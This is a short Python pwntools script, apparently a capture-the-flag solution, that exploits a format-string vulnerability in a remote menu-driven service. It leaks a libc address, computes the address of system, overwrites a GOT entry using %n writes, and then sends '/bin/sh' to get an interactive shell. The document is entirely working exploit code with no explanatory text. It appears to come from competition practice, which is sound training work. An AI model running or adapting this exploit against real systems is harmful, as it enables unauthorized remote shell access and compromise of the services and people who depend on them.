from pwn import *
system_off = 0x045390
main_ret = 0x020830
while True:
    __libc_start_main = 0x0000000000602038
    leak = "%653$p"
    payload = ""
    payload += "A"*(32-len(leak))
    payload += leak
    payload += "BBBBBBBB"
    #p = process("./challenge")
    p=remote("jh2i.com",50002)
    p.sendlineafter("> ","1")
    p.sendlineafter("add? ","abc")
    p.sendlineafter("> ","3")
    p.sendlineafter("item? ","1")
    p.sendlineafter("value? ",payload)
    p.recvuntil("New Value: AAAAAAAAAAAAAAAAAAAAAAAAAA0x")
    data = int(p.recvline()[:12],16)
    print "leak :",hex(data)
    print "####"
    base = data - main_ret
    system = base + system_off
    print "system: ",hex(system)
    print "base: ",hex(base)
    to_write = system & 0xffffffff
    print hex(to_write)
    #break
    if len(hex(to_write)) < 9:
        leak = "%78$n"
        payload = ""
        leak = "%" + str(to_write) + "x" + leak
        payload += leak
        payload += "A"*(32 - len(leak))
        payload += p64(0x0000000000602030)
        p.sendline("3")
        p.sendline("1")
        print "Fouuuuuuuuuuund"
        pause()
        p.sendline(payload)
        p.sendline("3")
        p.sendline("1")
        p.sendline("/bin/sh\x00")
        p.interactive()
    else:
        p.close()
        continue 
